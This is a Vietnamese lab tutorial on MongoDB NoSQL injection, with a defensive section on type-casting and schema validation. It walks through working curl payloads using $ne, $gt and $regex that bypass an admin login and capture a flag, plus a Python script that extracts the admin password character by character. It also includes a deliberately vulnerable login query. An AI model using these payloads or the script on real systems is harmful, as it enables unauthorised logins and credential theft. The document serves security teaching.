# NoSQL Injection — MongoDB Operator Bypass

> **Độ khó:** Medium — **Trình độ:** intermediate

## Giới thiệu

Không phải database nào cũng dùng SQL. **NoSQL** (MongoDB, CouchDB...) dùng **JSON** làm ngôn ngữ truy vấn. NoSQL Injection xảy ra khi app **trộn input của bạn vào câu truy vấn JSON** mà không kiểm tra — bạn có thể chèn **các operator đặc biệt** như `$ne` (not equal), `$gt` (greater than), `$regex` để đảo ngược logic xác thực hoặc lấy dữ liệu không thuộc quyền. Lỗ hổng nằm trong nhóm **A03 Injection**.

---

## Phần A — Hiểu (Understand)

### Khác biệt SQL vs NoSQL

| | SQL | NoSQL (MongoDB) |
|---|---|---|
| Ngôn ngữ | SQL string | JSON object |
| Truy vấn | `WHERE username='x'` | `{ username: 'x' }` |
| Kiểu injection | Thoát khỏi chuỗi | Chèn **operator** vào JSON |

### Cách app dính lỗ hổng

App login code kiểu này (Node.js + MongoDB):

```js
// LỖI CỐ Ý: trộn input trực tiếp vào query object
db.users.findOne({ username: user, password: pass });
```

Bạn gửi JSON body:

```json
{ "username": "admin", "password": "whatever" }
```

Giờ bạn sửa password thành **object operator**:

```json
{ "username": "admin", "password": { "$ne": "invalid" } }
```

Câu truy vấn thành:

```js
db.users.findOne({ username: "admin", password: { $ne: "invalid" } });
// Nghĩa là: password KHÁC "invalid" → LUÔN ĐÚNG với admin
```

→ Đăng nhập admin thành công mà không cần mật khẩu!

> **Dễ hiểu:** App hỏi database "password có bằng đúng cái này không?". Bạn đổi câu hỏi thành "password có khác cái này không?" (`$ne`) — đương nhiên là đúng. Operator chính là "từ khóa điều khiển" bạn chen vào câu hỏi.

### Các operator quan trọng

| Operator | Nghĩa | Dùng khi |
|----------|-------|----------|
| `$ne` | Not equal (khác) | Bypass login |
| `$gt` / `$gte` | Greater than / >= | Lấy user đầu tiên, vượt range |
| `$lt` / `$lte` | Less than / <= | Lọc theo điều kiện ngược |
| `$regex` | Khớp biểu thức chính quy | Trích xuất từng ký tự (giống blind) |
| `$exists` | Trường có tồn tại | Kiểm tra field |
| `$where` | Chạy JS server-side | Blind boolean (nặng) |
| `$in` | Thuộc tập hợp | Bypass nhiều giá trị |

---

## Phần B — Khai thác: Lab NoSQLi

### Bước 1: Khởi động lab

```bash
cd nosql-injection/lab
docker compose up -d

> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.

# Lab tại: <LAB_ADDRESS>
```

Lab là một API login (Node.js + Express + MongoDB), nhận JSON qua `POST /api/login`. DB có collection `users` với user `admin` (password hash) và `guest`.

<!-- Output already described via CLI commands above -->

### Bước 2: Xác nhận app dùng JSON

```bash
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"guest","password":"guest123"}'
{"success":true,"role":"user"}
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** Response JSON + API nhận body JSON → ứng viên cho NoSQLi (MongoDB truy vấn bằng JSON object).

### Bước 3: Bypass với `$ne` — đăng nhập admin không cần mật khẩu

```bash
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$ne":""}}'
{"success":true,"role":"admin","flag":"FLAG{n0sql_0p3r4t0r_2026}"}
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `{ "$ne": "" }` = "password khác chuỗi rỗng" → đúng với mọi password thật → admin login thành công. Bạn đã thay đổi **cấu trúc câu hỏi** chứ không chỉ giá trị.

### Bước 4: Thử `$gt` và `$regex`

```bash
# $gt: password > "" (bất kỳ chuỗi không rỗng nào) — bypass tương tự
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$gt":""}}'

# $regex: password có chứa chữ a (bắt đầu bằng bất kỳ + a)
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$regex":".*a.*"}}'
```

<!-- Output already described via CLI commands above -->

### Bước 5: Đánh cắp dữ liệu bằng `$regex` (extraction)

Giống blind SQLi — hỏi từng ký tự của password admin:

```bash
# Ký tự đầu là 'f'?
$ curl -s <LAB_ADDRESS>/api/login -X POST \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":{"$regex":"^f"}}'
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `$regex: "^f"` = "password bắt đầu bằng chữ f". Nếu đúng → login thành công. Thử `^a`, `^b`... để tìm ký tự đầu, rồi `^fa`, `^fb`... cho ký tự 2. Bạn vừa tái hiện "blind boolean" trong NoSQL.

### Bước 6: Tự động hóa extraction bằng script

```python
import requests, string

url = "<LAB_ADDRESS>/api/login"
charset = string.ascii_lowercase + string.digits + "_{}@.-"
password = ""
for i in range(1, 40):
    for c in charset:
        data = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=data)
        if r.json().get("success"):
            password += c
            print(f"[{i}] {password}")
            break
    else:
        break
print("PASSWORD:", password)
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** Vòng lặp xây dựng regex `^fa...` từng bước: chỉ giữ ký tự khi login thành công. Kết quả là password admin — dùng nó để đăng nhập như user thường và thấy toàn bộ quyền.

---

## Phần C — Phòng thủ & Checklist (Defend)

### Cách fix

1. **Không nhận object trực tiếp vào query.** Đọc từng field, ép kiểu:

```js
const username = String(req.body.username ?? '');
const password = String(req.body.password ?? '');
db.users.findOne({ username, password });
```

2. **Validate schema** — dùng library như `express-validator` hoặc khai báo schema rõ kiểu (string).
3. **Trong MongoDB, dùng `$` đúng cách:** nếu không cần operator, đừng cho user gửi object.
4. **Hash password + rate limit login.**

### Checklist test nhanh

```text
[ ] Gửi {"username":"admin","password":{"$ne":""}}  → bypass?
[ ] {"$gt":""}  /  {"$gt":"a"}  → vượt điều kiện?
[ ] {"$regex":".*"}  → luôn đúng?
[ ] {"$exists":false}  → field bị thiếu?
[ ] Đổi method/form khác (URL-encoded field có bị parse thành object không?)
[ ] Extract dữ liệu với {"$regex":"^..."}
```

---
